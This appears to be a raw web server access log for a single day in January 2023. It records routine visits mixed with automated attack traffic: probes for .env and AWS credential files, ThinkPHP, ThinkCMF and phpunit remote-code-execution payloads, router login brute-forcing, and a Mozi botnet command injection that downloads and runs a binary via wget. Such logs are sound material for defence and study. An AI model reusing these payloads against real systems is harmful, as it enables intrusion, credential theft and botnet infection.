143.110.222.166 - - [16/Jan/2023:03:06:49 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
80.94.92.57 - - [16/Jan/2023:03:44:19 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
60.217.75.70 - - [16/Jan/2023:03:59:53 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0"
143.110.222.166 - - [16/Jan/2023:04:07:38 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
80.94.92.57 - - [16/Jan/2023:04:39:59 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.12.253.180 - - [16/Jan/2023:04:42:50 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
45.12.253.180 - - [16/Jan/2023:04:42:56 -0600] "POST /HNAP1/ HTTP/1.1" 301 238 "-" "Mozila/5.0"
143.110.222.166 - - [16/Jan/2023:05:06:08 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
34.78.6.216 - - [16/Jan/2023:05:12:36 -0600] "GET / HTTP/1.1" 301 232 "-" "python-requests/2.28.1"
205.185.118.237 - - [16/Jan/2023:05:19:07 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
185.254.196.223 - - [16/Jan/2023:05:24:46 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [16/Jan/2023:05:24:47 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
179.43.177.242 - - [16/Jan/2023:05:37:29 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
159.65.111.248 - - [16/Jan/2023:05:41:03 -0600] "GET / HTTP/1.0" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0"
179.43.177.242 - - [16/Jan/2023:06:03:10 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
143.110.222.166 - - [16/Jan/2023:06:03:57 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
60.217.75.70 - - [16/Jan/2023:06:30:43 -0600] "\x16\x03\x01" 400 226 "-" "-"
193.35.18.107 - - [16/Jan/2023:06:32:52 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
80.94.92.57 - - [16/Jan/2023:06:39:53 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.239.84.90 - - [16/Jan/2023:06:45:44 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
143.110.222.166 - - [16/Jan/2023:07:03:23 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
187.110.208.54 - - [16/Jan/2023:07:06:48 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
31.220.1.83 - - [16/Jan/2023:07:09:20 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
189.85.40.235 - - [16/Jan/2023:07:37:15 -0600] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 226 "-" "-"
92.118.39.29 - - [16/Jan/2023:07:41:46 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
154.89.5.69 - - [16/Jan/2023:08:08:57 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
143.110.222.166 - - [16/Jan/2023:08:14:04 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.254.196.223 - - [16/Jan/2023:08:25:25 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [16/Jan/2023:08:25:26 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
152.89.196.211 - - [16/Jan/2023:08:57:49 -0600] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
143.110.222.166 - - [16/Jan/2023:09:12:15 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
104.207.254.7 - - [16/Jan/2023:09:23:04 -0600] "GET /style.php?sig=rename HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"
104.207.254.7 - - [16/Jan/2023:09:23:04 -0600] "GET /wp-admin/style.php?sig=rename HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.81 Mobile Safari/537.36"
152.89.196.211 - - [16/Jan/2023:09:28:47 -0600] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
179.43.177.242 - - [16/Jan/2023:09:44:17 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
64.62.197.36 - - [16/Jan/2023:09:55:59 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; rv:104.0) Gecko/20100101 Firefox/104.0"
64.62.197.33 - - [16/Jan/2023:09:57:41 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0"
64.62.197.40 - - [16/Jan/2023:09:58:11 -0600] "GET /favicon.ico HTTP/1.1" 301 243 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
143.110.222.166 - - [16/Jan/2023:10:09:20 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
5.148.11.122 - - [16/Jan/2023:10:12:30 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
143.110.241.236 - - [16/Jan/2023:10:18:32 -0600] "GET / HTTP/1.0" 301 233 "-" "-"
88.0.10.62 - - [16/Jan/2023:10:22:51 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
152.89.196.211 - - [16/Jan/2023:10:33:03 -0600] "GET /solr/admin/info/system?wt=json HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
162.240.47.12 - - [16/Jan/2023:10:34:11 -0600] "-" 408 - "-" "-"
179.43.177.242 - - [16/Jan/2023:10:46:35 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
109.237.97.180 - - [16/Jan/2023:11:06:36 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:36 -0600] "POST /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:36 -0600] "\x16\x03\x01\x01H\x01" 400 226 "-" "-"
109.237.97.180 - - [16/Jan/2023:11:06:37 -0600] "GET /.aws/config HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:37 -0600] "GET /.aws/credentials HTTP/1.1" 301 248 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:37 -0600] "POST /.aws/config HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:37 -0600] "POST /.aws/credentials HTTP/1.1" 301 248 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:38 -0600] "GET /aws/credentials HTTP/1.1" 301 247 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:38 -0600] "GET /credentials HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:38 -0600] "POST /aws/credentials HTTP/1.1" 301 247 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:39 -0600] "GET /laravel/.env HTTP/1.1" 301 244 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:39 -0600] "GET /test.php HTTP/1.1" 301 240 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:39 -0600] "POST /credentials HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:39 -0600] "POST /test.php HTTP/1.1" 301 240 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:40 -0600] "GET /demo/.env HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:40 -0600] "POST /demo/.env HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:40 -0600] "POST /laravel/.env HTTP/1.1" 301 244 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:41 -0600] "GET /phpinfo HTTP/1.1" 301 239 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:41 -0600] "GET /web/.env HTTP/1.1" 301 240 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:41 -0600] "POST /phpinfo HTTP/1.1" 301 239 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:41 -0600] "POST /web/.env HTTP/1.1" 301 240 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [16/Jan/2023:11:08:11 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
62.233.50.179 - - [16/Jan/2023:11:18:48 -0600] "\x03" 400 226 "-" "-"
185.254.196.223 - - [16/Jan/2023:11:26:22 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [16/Jan/2023:11:26:23 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
152.89.196.211 - - [16/Jan/2023:11:27:28 -0600] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 301 356 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
80.94.95.25 - - [16/Jan/2023:11:35:40 -0600] "CONNECT cipicaoadminpanel.xyz:443 HTTP/1.1" 301 232 "-" "Go-http-client/1.1"
54.37.163.160 - - [16/Jan/2023:11:54:58 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.163.160 - - [16/Jan/2023:11:54:59 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
152.89.196.211 - - [16/Jan/2023:11:57:38 -0600] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 301 300 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
143.110.222.166 - - [16/Jan/2023:12:09:54 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
178.128.83.89 - - [16/Jan/2023:12:19:19 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
152.89.196.211 - - [16/Jan/2023:13:07:35 -0600] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
143.110.222.166 - - [16/Jan/2023:13:10:05 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.83.31.179 - - [16/Jan/2023:13:12:49 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
91.238.29.56 - - [16/Jan/2023:13:40:46 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
179.43.177.242 - - [16/Jan/2023:13:43:16 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
152.89.196.211 - - [16/Jan/2023:13:58:19 -0600] "GET /console/ HTTP/1.1" 301 240 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
194.38.20.161 - - [16/Jan/2023:13:58:48 -0600] "GET /components/com_jnews/includes/openflashchart/tmp-upload-images/255test.php?com=123&content=ZWNobyAidmRhZHNmZ2RmIjs= HTTP/1.1" 301 360 "-" "ALittle Client"
80.94.92.57 - - [16/Jan/2023:14:10:52 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
143.110.222.166 - - [16/Jan/2023:14:12:35 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.254.196.223 - - [16/Jan/2023:14:20:59 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [16/Jan/2023:14:21:00 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
152.89.196.211 - - [16/Jan/2023:14:24:08 -0600] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
128.1.39.69 - - [16/Jan/2023:14:27:54 -0600] "\x16\x03\x01\x01\t\x01" 400 226 "-" "-"
128.1.39.69 - - [16/Jan/2023:14:28:05 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
128.1.39.69 - - [16/Jan/2023:14:28:12 -0600] "GET /favicon.ico HTTP/1.1" 301 243 "-" "Go-http-client/1.1"
128.1.39.69 - - [16/Jan/2023:14:28:16 -0600] "GET /robots.txt HTTP/1.1" 301 242 "-" "Go-http-client/1.1"
128.1.39.69 - - [16/Jan/2023:14:28:18 -0600] "GET /sitemap.xml HTTP/1.1" 301 243 "-" "Go-http-client/1.1"
62.233.50.179 - - [16/Jan/2023:14:45:28 -0600] "\x03" 400 226 "-" "-"
152.89.196.211 - - [16/Jan/2023:15:10:45 -0600] "GET /_ignition/execute-solution HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.35.18.110 - - [16/Jan/2023:15:11:06 -0600] "CONNECT google.com:443 HTTP/1.1" 301 232 "-" "Go-http-client/1.1"
179.43.177.242 - - [16/Jan/2023:15:11:58 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
152.89.196.211 - - [16/Jan/2023:15:37:10 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
205.185.118.237 - - [16/Jan/2023:15:40:02 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
92.118.39.29 - - [16/Jan/2023:15:42:56 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
198.235.24.25 - - [16/Jan/2023:15:58:24 -0600] "GET / HTTP/1.1" 301 241 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
152.89.196.211 - - [16/Jan/2023:16:09:49 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
205.185.118.237 - - [16/Jan/2023:16:17:32 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
113.142.131.55 - - [16/Jan/2023:16:19:27 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
152.89.196.211 - - [16/Jan/2023:16:21:39 -0600] "GET /actuator/gateway/routes HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
2a06:4880:f000::c0 - - [16/Jan/2023:16:24:04 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
143.110.222.166 - - [16/Jan/2023:17:07:38 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.254.196.223 - - [16/Jan/2023:17:25:06 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [16/Jan/2023:17:25:07 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
179.43.177.242 - - [16/Jan/2023:18:02:51 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [16/Jan/2023:18:09:27 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
188.186.4.12 - - [16/Jan/2023:18:13:07 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
183.136.225.32 - - [16/Jan/2023:18:15:55 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
183.136.225.32 - - [16/Jan/2023:18:16:27 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.32 - - [16/Jan/2023:18:16:47 -0600] "GET /favicon.ico HTTP/1.1" 301 243 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.32 - - [16/Jan/2023:18:17:28 -0600] "GET /robots.txt HTTP/1.1" 301 242 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
167.94.145.59 - - [16/Jan/2023:18:20:23 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
167.94.145.59 - - [16/Jan/2023:18:20:23 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.59 - - [16/Jan/2023:18:20:23 -0600] "PRI * HTTP/2.0" 400 226 "-" "-"
143.110.222.166 - - [16/Jan/2023:19:06:33 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
36.102.6.27 - - [16/Jan/2023:19:57:35 -0600] "GET / HTTP/1.1" 400 226 "-" "-"
143.110.222.166 - - [16/Jan/2023:20:07:10 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
179.43.177.242 - - [16/Jan/2023:20:20:09 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
185.254.196.223 - - [16/Jan/2023:20:25:24 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [16/Jan/2023:20:25:25 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [16/Jan/2023:21:07:47 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
2001:470:1:332::164 - - [16/Jan/2023:21:20:14 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.33"
